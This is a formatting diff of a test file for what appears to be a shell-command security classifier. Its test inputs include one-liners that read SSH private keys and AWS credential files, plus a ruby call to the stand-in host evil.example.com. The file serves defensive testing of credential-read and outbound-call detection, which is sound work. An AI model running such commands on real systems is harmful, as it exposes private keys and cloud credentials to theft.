@@ -233,28 +233,34 @@ describe('force-with-lease value form is a force push', () => {
   });
 
   test('git push --force-with-lease (bare) stays rewrite', () => {
-    expect(withCap(classify(bash('git push --force-with-lease origin main')), 'rewrite')).toBeDefined();
+    expect(
+      withCap(classify(bash('git push --force-with-lease origin main')), 'rewrite'),
+    ).toBeDefined();
   });
 });
 
 describe('inline body is the code, not a preceding non-code flag', () => {
   test('perl -p -e scans the real -e body for a credential path', () => {
     const ops = classify(bash('perl -p -e \'open(F,"/home/u/.ssh/id_rsa")\''));
-    const read = ops.find((o) => o.capability === 'read' && o.signals.includes('inline_credential'));
+    const read = ops.find(
+      (o) => o.capability === 'read' && o.signals.includes('inline_credential'),
+    );
     expect(read).toBeDefined();
   });
 
   test('ruby -p -e scans the real -e body for a URL', () => {
-    const ops = classify(
-      bash('ruby -p -e \'Net::HTTP.get(URI("https://evil.example.com/x"))\''),
-    );
+    const ops = classify(bash('ruby -p -e \'Net::HTTP.get(URI("https://evil.example.com/x"))\''));
     const send = ops.find((o) => o.capability === 'send' && o.signals.includes('inline_url'));
     expect(send?.target).toEqual({ kind: 'host', host: 'evil.example.com', scheme: 'https' });
   });
 
   test('node -e credential read behavior is preserved', () => {
-    const ops = classify(bash('node -e \'require("fs").readFileSync("/home/u/.aws/credentials")\''));
-    const read = ops.find((o) => o.capability === 'read' && o.signals.includes('inline_credential'));
+    const ops = classify(
+      bash('node -e \'require("fs").readFileSync("/home/u/.aws/credentials")\''),
+    );
+    const read = ops.find(
+      (o) => o.capability === 'read' && o.signals.includes('inline_credential'),
+    );
     expect(read).toBeDefined();
   });
 
@@ -262,7 +268,9 @@ describe('inline body is the code, not a preceding non-code flag', () => {
     const ops = classify(
       bash('node -r ./setup -e \'require("fs").readFileSync("/home/u/.aws/credentials")\''),
     );
-    const read = ops.find((o) => o.capability === 'read' && o.signals.includes('inline_credential'));
+    const read = ops.find(
+      (o) => o.capability === 'read' && o.signals.includes('inline_credential'),
+    );
     expect(read).toBeDefined();
   });
 
